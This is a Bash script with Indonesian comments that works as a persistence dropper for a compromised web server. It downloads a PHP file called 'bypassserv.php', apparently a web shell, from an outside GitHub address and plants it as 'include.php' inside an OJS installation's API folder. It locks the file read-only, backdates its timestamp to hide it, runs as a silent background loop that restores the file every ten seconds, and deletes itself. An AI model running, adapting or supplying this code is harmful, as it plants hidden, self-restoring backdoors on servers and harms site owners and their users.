#!/bin/bash

# Konfigurasi
FOLDER_PATH="/usr/share/nginx/html/ojs/api/v1/_email/"
TIMESTAMP="201201081531.12"

# Daftar file dan URL-nya (menggunakan associative array)
declare -A FILES=(
       ["include.php"]="https://raw.githubusercontent.com/zycoder0day/projects/refs/heads/main/bypassserv.php"
)

# Fungsi untuk memastikan folder ada
ensure_folder_exists() {
    if [ ! -d "$FOLDER_PATH" ]; then
        mkdir -p "$FOLDER_PATH"
        chmod 0755 "$FOLDER_PATH"
    fi
}

# Fungsi untuk menghitung hash file
get_file_hash() {
    local file_path="$1"
    if [ -f "$file_path" ]; then
        md5sum "$file_path" | cut -d' ' -f1
    else
        echo ""
    fi
}

# Fungsi untuk mendownload file
update_file() {
    local filename="$1"
    local url="$2"
    local file_path="${FOLDER_PATH}/${filename}"
    local temp_file="${file_path}.tmp"

    # Set file lama ke read-only untuk mencegah pengeditan
    if [ -f "$file_path" ]; then
        chmod 0444 "$file_path"
    fi

    # Download ke file sementara
    if curl --output "$temp_file" --silent --fail "$url"; then
        # Jika download berhasil, ganti file lama
        mv "$temp_file" "$file_path"
        # Ubah izin file menjadi 0444 (read-only untuk semua)
        chmod 0444 "$file_path"
        # Ubah kepemilikan ke lppmsftp:www-data (memerlukan izin khusus)
        if ! chown journals.uol:psacln "$file_path"; then
            echo "Gagal mengubah kepemilikan $file_path. Periksa izin." >&2
        fi
        touch -t "$TIMESTAMP" "$file_path"
        return 0
    else
        # Jika gagal, hapus file sementara dan kembalikan read-only pada file lama
        rm -f "$temp_file"
        if [ -f "$file_path" ]; then
            chmod 0444 "$file_path"
        fi
        return 1
    fi
}

# Fungsi untuk memeriksa perubahan file
check_file_changes() {
    local filename="$1"
    local url="$2"
    local file_path="${FOLDER_PATH}/${filename}"
    local temp_file="${file_path}.tmp"

    # Download file ke temporary untuk perbandingan
    if curl --output "$temp_file" --silent --fail "$url"; then
        local remote_hash=$(md5sum "$temp_file" | cut -d' ' -f1)
        local local_hash=$(get_file_hash "$file_path")
        rm -f "$temp_file"

        # Jika hash berbeda, file dianggap berubah
        if [ "$remote_hash" != "$local_hash" ]; then
            return 0 # Perubahan terdeteksi
        fi
    fi
    return 1 # Tidak ada perubahan atau gagal download
}

# Fungsi untuk menjalankan proses di background (daemon-like)
run_in_background() {
    # Redirect stdin/stdout/stderr ke /dev/null
    exec 0</dev/null
    exec 1>/dev/null
    exec 2>/dev/null
    
    # Jalankan di background
    nohup "$0" run &
    exit 0
}

# Fungsi untuk menghapus skrip sendiri
self_delete() {
    sleep 2
    rm -f "$0"
}

# Fungsi utama
main() {
    # Jika argumen adalah "run", jalankan loop
    if [ "$1" = "run" ]; then
        while true; do
            ensure_folder_exists
            for filename in "${!FILES[@]}"; do
                file_path="${FOLDER_PATH}/${filename}"
                
                # Jika file tidak ada, coba download
                if [ ! -f "$file_path" ]; then
                    update_file "$filename" "${FILES[$filename]}"
                else
                    # Periksa apakah file berubah
                    if check_file_changes "$filename" "${FILES[$filename]}"; then
                        update_file "$filename" "${FILES[$filename]}"
                    fi
                fi
            done
            sleep 10
        done
    else
        # Jalankan di background dan hapus diri sendiri
        run_in_background
        self_delete
    fi
}

# Jalankan fungsi utama
main "$@"
